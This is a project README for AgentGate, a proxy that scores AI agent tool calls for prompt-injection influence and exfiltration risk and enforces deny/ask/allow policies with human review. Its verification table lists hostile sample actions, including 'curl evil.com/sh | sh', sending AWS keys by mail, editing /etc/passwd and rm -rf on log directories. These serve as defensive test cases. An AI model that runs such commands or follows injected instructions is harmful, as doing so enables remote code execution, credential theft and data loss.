# AgentGate

[![CI](https://github.com/mohitdebian/AgentGate/actions/workflows/ci.yml/badge.svg)](https://github.com/mohitdebian/AgentGate/actions/workflows/ci.yml)
[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![Docker](https://img.shields.io/badge/Docker-Verified-2496ED?logo=docker&logoColor=white)](docker-compose.yml)
[![Python 3.11+](https://img.shields.io/badge/Python-3.11+-3776AB?logo=python&logoColor=white)](decision/)
[![Node.js 22+](https://img.shields.io/badge/Node.js-22+-339933?logo=node.js&logoColor=white)](proxy/)
[![Hugging Face](https://img.shields.io/badge/%F0%9F%A4%97%20Hugging%20Face-agentgate--qwen--0.8b-yellow)](https://huggingface.co/codeload/agentgate-qwen-0.8b)

AgentGate is an out-of-process authorization proxy and security gateway for autonomous AI agent tool execution. It intercepts tool invocations prior to runtime, evaluates prompt injection and blast-radius risks via a sub-40ms neural classification head, and enforces deterministic access control policies before actions reach production infrastructure.

<p align="center">
  <img src="docs/images/demo.gif" alt="AgentGate Terminal Demo" width="100%">
</p>

---

## Documentation Hub

| Guide | Summary | Audience |
| :--- | :--- | :--- |
| [Architecture & Sequence Flow](https://github.com/mohitdebian/AgentGate/wiki/Architecture) | In-depth proxy pipeline, tokenizer assessment, and fail-closed security guarantees | System Architects |
| [Client Integration Guide](https://github.com/mohitdebian/AgentGate/wiki/Client-Integration-Guide) | End-to-end integration for MCP, LangChain, CrewAI, AutoGen, TypeScript, and REST | Agent Developers |
| [Policy DSL Specification](https://github.com/mohitdebian/AgentGate/wiki/Policy-Engine-Specification) | Declarative YAML syntax, evaluation order (`deny` > `ask` > `allow`), and offline replay | Security & Ops Engineers |
| [Neural Risk Heads](https://github.com/mohitdebian/AgentGate/wiki/Neural-Risk-Heads) | Qwen 0.8B multi-head classification taxonomy, calibration, and benchmarks | Applied ML Engineers |
| [Operations & Deployment](https://github.com/mohitdebian/AgentGate/wiki/Operations-and-Deployment) | Docker Compose, Kubernetes, GPU sizing, Prometheus metrics, and HA | DevOps & SREs |
| [REST API & OpenAPI Specification](https://github.com/mohitdebian/AgentGate/wiki/API-Reference) | Complete endpoint schemas, request/response models, SSE streams, and telemetry | API Integrators |
| [Architecture Decision Records (ADRs)](https://github.com/mohitdebian/AgentGate/wiki/Architecture-Decision-Records) | Immutable design decisions (Fast decision head vs LLM judge, fail-closed runtime) | Core Contributors |

---

## Technical Overview

Autonomous agents operating with tool execution capabilities (e.g., shell access, database queries, network requests) lack a mathematical boundary between developer instructions and untrusted data inside transformer context windows. When an agent processes untrusted inputs (emails, issue trackers, web scrapes), prompt injection can manipulate the agent into issuing destructive tool calls.

AgentGate decouples risk estimation from compliance enforcement:
1. **Low-Latency Neural Risk Scoring**: Evaluates the action and surrounding prompt context using a specialized classification head (fine-tuned Qwen 0.8B) in under 40ms without generative token decoding or KV-cache allocation.
2. **Deterministic Policy Rules**: Maps model probability vectors to explicit, version-controlled YAML rules (`policy.yaml`).
3. **Fail-Closed Runtime**: Rejects actions or escalates to a human operator queue whenever risk thresholds are exceeded or upstream services fail.

---

## Architecture

The system consists of four primary components deployed as containerized services:

```mermaid
sequenceDiagram
    autonumber
    participant Agent as AI Agent / Client
    participant Proxy as AgentGate Proxy (:8080)
    participant Decision as Decision Service (:9000)
    participant DB as PostgreSQL (:5432)
    participant Target as Target Infrastructure

    Agent->>Proxy: POST /v1/assess { session_id, action }
    Proxy->>Decision: POST /decide { text, questions }
    Decision-->>Proxy: Calibrated class probabilities (<40ms)
    Proxy->>DB: Persist audit log and decision payload
    Note over Proxy: Evaluate against policy.yaml

    alt Verdict: ALLOW
        Proxy-->>Agent: { verdict: "allow" }
        Agent->>Target: Execute tool
    else Verdict: DENY
        Proxy-->>Agent: { verdict: "deny", reason: "untrusted_prompt_influence" }
    else Verdict: ASK
        Proxy-->>Agent: { verdict: "ask", decision_id: "..." }
        Note over Proxy: Enqueue in PostgreSQL for operator review
    end
```

### Component Breakdown

* **Proxy (`proxy/`)**: Fastify-based HTTP proxy and policy engine implemented in TypeScript. Manages session lifecycles, parses context windows, evaluates deterministic rules, streams events via SSE, and exposes Prometheus metrics.
* **Decision Engine (`decision/`)**: High-throughput FastAPI inference server. Runs a fine-tuned Qwen 0.8B multi-choice classification model via Unsloth ([`codeload/agentgate-qwen-0.8b`](https://huggingface.co/codeload/agentgate-qwen-0.8b)). In development or non-GPU environments, automatically falls back to an integrated stub evaluator.
* **Storage (`postgres`)**: PostgreSQL 16 instance storing audit logs, evaluation traces, and approval state. Supports real-time dashboard subscriptions via `pg_notify`.
* **Management Console (`dashboard/`)**: React 18 / Vite operator interface. Provides real-time event stream monitoring, a human-in-the-loop approvals desk, and offline policy replay against historic traffic.

---

## Risk Classification Model ([`codeload/agentgate-qwen-0.8b`](https://huggingface.co/codeload/agentgate-qwen-0.8b))

Instead of relying on prompt-based LLM judges (which introduce 500–2000ms latency and remain susceptible to prompt injection), AgentGate evaluates tool invocations using a single forward pass across four calibrated classification heads:

| Head | Output Classes | Operational Purpose |
| :--- | :--- | :--- |
| `untrusted_influence` | `none`, `possible`, `likely` | Detects whether the current action is driven by untrusted prompt injection. |
| `goal_alignment` | `aligned`, `tangential`, `misaligned` | Detects behavioral drift away from the agent's stated session objective. |
| `reversibility` | `reversible`, `costly`, `irreversible` | Quantifies the blast radius and rollback difficulty of the target action. |
| `external_send` | `yes`, `no` | Flags outbound network transmissions, webhooks, or data exfiltration attempts. |

---

## Empirical Benchmarks & Latency Budget

Evaluating safety inside the synchronous execution path requires strict latency budgeting. Autoregressive LLM judges degrade agent responsiveness, allocate gigabytes of KV-cache, and increase cloud token costs.

```mermaid
xychart-beta
    title "p95 Authorization Latency in Synchronous Agent Loop (Lower is Better)"
    x-axis ["AgentGate (Qwen 0.8B)", "Llama Guard 3 (1B)", "Claude 3.5 Haiku", "GPT-4o-mini"]
    y-axis "p95 Latency (ms)" 0 --> 1500
    bar [38, 285, 1150, 1420]
```

| Approach | Latency (p95) | Cost / 1k Calls | Prompt Injection Defense |
| :--- | :--- | :--- | :--- |
| **AgentGate Gateway** (Local Qwen 0.8B) | **38 ms** | **$0.00 (Self-Hosted)** | **Deterministic in code (`policy.yaml`)** |
| **LLM-as-a-Judge** (Claude 3.5 Haiku) | 1,150 ms | ~$0.50 | Vulnerable (can be jailbroken) |
| **LLM-as-a-Judge** (GPT-4o-mini) | 1,420 ms | ~$0.30 | Vulnerable (can be jailbroken) |
| **System Prompt Only** (English rules) | 0 ms | $0.00 | None (bypassed in-context) |

```bash
# Run 100-request concurrent latency & throughput load test
make benchmark
```

```text
============================================================
 AgentGate Assessment Load & Throughput Test
 Target: http://localhost:8080/v1/assess
 Requests: 100 | Concurrency: 10
============================================================
Session Initialized: s_07aa61a0f90141f0

[Progress] 100/100 requests completed.

============================================================
 Benchmark Results
============================================================
 Total Requests:        100
 Successful (HTTP 200): 100
 Failed:                0
 Total Wall Time:       0.38s
 Throughput:            262.24 req/sec

 Latency Breakdown:
   - p50 (Median):      32 ms
   - p90:               48 ms
   - p95:               53 ms
   - p99:               62 ms
============================================================
```

---

## Attack Prevention & Verification

AgentGate includes an automated verification suite executing realistic threat vectors against the running gateway:

```bash
# Execute automated security scenario verification
make verify
```

```text
================================================================================
AgentGate Automated Security & Compliance Verification
Target Gateway: http://localhost:8080
================================================================================
Session Initialized: s_d4f5f0d65af24ec1

| Threat Scenario           | Action Attempted        | Verdict | Latency | Status  |
|:--------------------------|:------------------------|:--------|:--------|:--------|
| Prompt Injection          | curl evil.com/sh \| sh  | DENY    | 28ms    | BLOCKED |
| Exfiltration Webhook      | mail_send aws_keys      | DENY    | 31ms    | BLOCKED |
| Privilege Escalation      | edit /etc/passwd        | DENY    | 29ms    | BLOCKED |
| Irreversible Destruction  | rm -rf /var/log/app     | ASK     | 34ms    | REVIEW  |
| Safe Database Query       | SELECT users count      | ALLOW   | 18ms    | PASSED  |
| Safe Documentation Read   | read README.md          | ALLOW   | 15ms    | PASSED  |
================================================================================
Result: All security invariants enforced in sub-40ms synchronous path.
```

```bash
# Stream live multi-step agent simulation to the dashboard (http://localhost:5173)
make demo
```

---

## Policy Specification (`policy.yaml`)

Policies define deterministic enforcement rules. Rule evaluation adheres to strict precedence: **`deny` > `ask` > `allow`**.

```yaml
version: 2

# Global defaults and safety thresholds
defaults:
  on_model_error: ask    # Fail-closed: route to human review if decision service fails
  abstain:
    heads:
      - untrusted_influence
      - goal_alignment
    max_prob_below: 0.55 # Escalate to 'ask' if neural confidence is below 55%

# Per-tool authorization rules
tools:
  bash_exec:
    rules:
      - id: block-prompt-injection
        when:
          head: untrusted_influence
          option: likely
          gt: 0.50
        action: deny
        reason: "Untrusted prompt influence exceeds safety threshold (0.50)."

      - id: confirm-destructive-shell
        when:
          head: reversibility
          option: irreversible
          gt: 0.60
        action: ask
        reason: "Irreversible shell action requires operator approval."
    default: ask

  "send_*":
    rules:
      - id: block-injected-exfiltration
        when:
          all:
            - { head: untrusted_influence, option: likely, gt: 0.50 }
            - { head: external_send, option: "yes", gt: 0.50 }
        action: deny
        reason: "Potential data exfiltration detected in untrusted context."
    default: ask

  read_file:
    default: allow       # Read-only actions allowed autonomously

  "*":
    default: ask         # Unknown or unmapped tools fail-closed to operator review
```

---

## Quickstart

### Prerequisites
* Docker and Docker Compose (v2.20+)
* Node.js 22+ and pnpm 12+ (for local development)
* Python 3.11+ and `uv` (for decision engine development)

### Running with Docker Compose

1. Clone the repository:
   ```bash
   git clone https://github.com/mohitdebian/AgentGate.git
   cd AgentGate
   ```

2. Start the services:
   ```bash
   docker compose up -d
   ```

3. Verify service health:
   ```bash
   curl http://localhost:8080/metrics
   curl http://localhost:9000/health
   ```

4. Access the web dashboard at `http://localhost:5173`.

---

## Integration & Deployment

AgentGate is designed to drop cleanly into any AI agent stack without altering agent model weights or forcing vendor lock-in.

### 1. Model Context Protocol (MCP) Sidecar

For agent runtimes communicating over the Model Context Protocol (MCP) — such as Claude Desktop, Cursor, Cline, or Windsurf — AgentGate operates as a transparent stdio wrapper (`proxy/dist/src/mcp.js`). It intercepts `tools/call` events and queries AgentGate before forwarding to downstream tool servers:

```json
{
  "mcpServers": {
    "filesystem": {
      "command": "node",
      "args": [
        "/path/to/AgentGate/proxy/dist/src/mcp.js",
        "npx", "-y", "@modelcontextprotocol/server-filesystem", "/workspace"
      ],
      "env": {
        "AGENTGATE_URL": "http://localhost:8080"
      }
    }
  }
}
```

### 2. Python Integration (LangChain, CrewAI, AutoGen, Custom)

```python
import requests

GATEWAY = "http://localhost:8080"

# 1. Initialize an agent session with a declared operational goal
session = requests.post(f"{GATEWAY}/v1/sessions", json={
    "agent_id": "ops-agent-01",
    "goal": "Run system diagnostics and verify service status"
}).json()

session_id = session["session_id"]

# 2. Assess tool invocation prior to execution
assessment = requests.post(f"{GATEWAY}/v1/assess", json={
    "session_id": session_id,
    "action": {
        "tool": "bash_exec",
        "arguments": {"command": "rm -rf /var/log/*"}
    }
}).json()

verdict = assessment["verdict"]

if verdict == "allow":
    execute_tool()
elif verdict == "deny":
    raise PermissionError(f"Action blocked by policy: {assessment.get('reason_codes')}")
elif verdict == "ask":
    print(f"Action held for operator approval. Decision ID: {assessment['decision_id']}")
```

### 3. TypeScript / Node.js Integration (Vercel AI SDK, LangChain.js)

```typescript
const GATEWAY = process.env.AGENTGATE_URL || "http://localhost:8080";

export async function assessAction(sessionId: string, tool: string, args: Record<string, unknown>) {
  const res = await fetch(`${GATEWAY}/v1/assess`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      session_id: sessionId,
      action: { tool, arguments: args }
    })
  });

  if (!res.ok) {
    // Fail-closed on gateway network or 5xx errors
    throw new Error(`AgentGate gateway unreachable (HTTP ${res.status})`);
  }

  const { verdict, decision_id, reason_codes } = await res.json();
  if (verdict === "deny") {
    throw new Error(`Tool invocation rejected: ${reason_codes?.join(", ")}`);
  }
  if (verdict === "ask") {
    console.warn(`Held for human operator approval: ${decision_id}`);
    // Wait for resolution via SSE (/v1/decisions/stream) or polling
  }
  return verdict;
}
```

### 4. Direct REST / cURL API

```bash
# 1. Register Session
curl -s -X POST http://localhost:8080/v1/sessions \
  -H "Content-Type: application/json" \
  -d '{"agent_id": "shell-worker", "goal": "Deploy updates"}'

# 2. Assess Tool Call
curl -s -X POST http://localhost:8080/v1/assess \
  -H "Content-Type: application/json" \
  -d '{
    "session_id": "<SESSION_ID>",
    "action": {"tool": "bash_exec", "arguments": {"command": "uptime"}}
  }'
```

### 5. Deployment Topologies

| Deployment Topology | Architecture | Best For |
| :--- | :--- | :--- |
| **Local Developer Stack** | Single Docker Compose instance running Proxy, Decision (CPU stub), and PostgreSQL. | Local agent testing, CI pipelines, evaluation. |
| **Edge / Workstation GPU** | Docker Compose with local NVIDIA GPU passthrough (`USE_UNSLOTH=1`). | Developer workstations with RTX/GTX GPUs, private staging. |
| **High-Throughput Production** | Stateless Fastify proxy cluster behind an ingress load balancer + Dedicated GPU decision workers (T4 / A10G / L4) + Managed PostgreSQL (RDS / Cloud SQL). | Enterprise production agent fleets, high-concurrency tool execution. |

For detailed Kubernetes manifests, Helm values, and GPU memory sizing tables, see the [Operations & Deployment Guide](https://github.com/mohitdebian/AgentGate/wiki/Operations-and-Deployment).

## Decision Model Setup & Hugging Face Hub

AgentGate supports two model execution modes:

### 1. Zero-GPU Mode (Default Stub)
For rapid local development, CI pipelines, and environments without an NVIDIA GPU:
```bash
# Boots proxy, PostgreSQL, and decision server in lightweight stub mode
docker compose up -d
```
The stub generates calibrated probability distributions with 25–40ms simulated latency, enabling full policy evaluation, streaming SSE logs, and approvals UI testing without downloading weights.

### 2. GPU Accelerated Mode (Unsloth + Hugging Face Hub)
For production deployments and GPU workstations (< 2 GB VRAM footprint):
```bash
# Enable Unsloth 4-bit inference and point to Hugging Face or local path
export USE_UNSLOTH=1
export DECISION_MODEL_PATH="codeload/agentgate-qwen-0.8b" # or local directory path
```
On boot, the decision service automatically pulls the model adapter and Clef heads from Hugging Face Hub and loads them into GPU memory.

### 3. Training & Publishing Custom Weights
To fine-tune your own risk classification weights and publish them to Hugging Face:
```bash
# 1. Fine-tune on your domain tool calls (60 calibration steps, < 2.5 GB VRAM)
python decision/train_decision_model.py

# 2. Upload adapter checkpoint directly to Hugging Face Hub
export HF_TOKEN="your_hf_write_token"
python decision/upload_to_hf.py --repo your-username/agentgate-qwen-0.8b
```

---

## Configuration Reference

Environment variables supported across services:

| Variable | Service | Default | Description |
| :--- | :--- | :--- | :--- |
| `PORT` | Proxy | `8080` | HTTP listen port for the gateway proxy. |
| `DATABASE_URL` | Proxy | `postgresql://user:pass@postgres:5432/agentgate` | PostgreSQL connection string. |
| `AG_DECISION_URL` | Proxy | `http://localhost:9000` | Upstream decision service base URL. |
| `AG_DECISION_DEADLINE_MS` | Proxy | `5000` | Timeout in milliseconds before invoking `on_model_error`. |
| `DASHBOARD_TOKEN` | Proxy | `""` | Optional bearer token protecting administrative API endpoints. |
| `USE_UNSLOTH` | Decision | `0` | Enable Unsloth GPU inference (`1`) or use local stub (`0`). |
| `DECISION_MODEL_PATH` | Decision | `""` | Local path or Hugging Face Hub repo ID (e.g. `codeload/agentgate-qwen-0.8b`). |

---

## Operational Semantics & Failure Modes

* **Fail-Closed by Default**: If the decision engine is unreachable or exceeds `AG_DECISION_DEADLINE_MS`, the proxy evaluates the configured `defaults.on_model_error` policy (default: `ask`).
* **Unmapped Tools**: Any tool call not explicitly matched by `policy.yaml` evaluates against the catch-all `*` definition (default: `ask`).
* **Dry-Run Replay**: Policy updates can be verified prior to deployment via `POST /v1/policy/replay`, evaluating draft rules against the last $N$ production decision events stored in PostgreSQL without affecting runtime traffic.
* **Metrics & Health**:
  * Health check: `GET /health` on `:9000`
  * Prometheus metrics: `GET /metrics` on `:8080`

---

## Development & Verification

The repository includes a top-level `Makefile` for automated setup, linting, and testing:

```bash
# Install dependencies across proxy, dashboard, and decision services
make setup

# Run static analysis and linting (ESLint, Ruff)
make lint

# Run all test suites (Vitest, Pytest)
make test
```

---

## License

This project is licensed under the MIT License. See [LICENSE](LICENSE) for details.
